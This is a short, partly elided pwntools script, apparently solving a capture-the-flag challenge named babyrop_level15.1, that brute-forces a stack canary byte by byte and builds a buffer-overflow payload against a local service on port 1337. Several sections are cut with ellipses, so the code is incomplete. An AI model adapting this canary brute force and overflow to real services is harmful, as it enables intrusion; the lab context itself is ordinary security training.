from pwn import *
import os
first_pid = os.popen('pidof /challenge/babyrop_level15.1').read().strip()


def kill_dup_ps(id):
    l = os.popen('pidof /challenge/babyrop_level15.1').read().strip().split(' ')
    if len(l) == 1 :
        return
...
for i in range(7):
    ...
    while True:
        ...
        r.send(b'\x00'*0x68+canary+b_guess)
...
r = remote('0.0.0.0','1337')
payload = b'\x00'*0x68 + p64(canary) + p64(0)
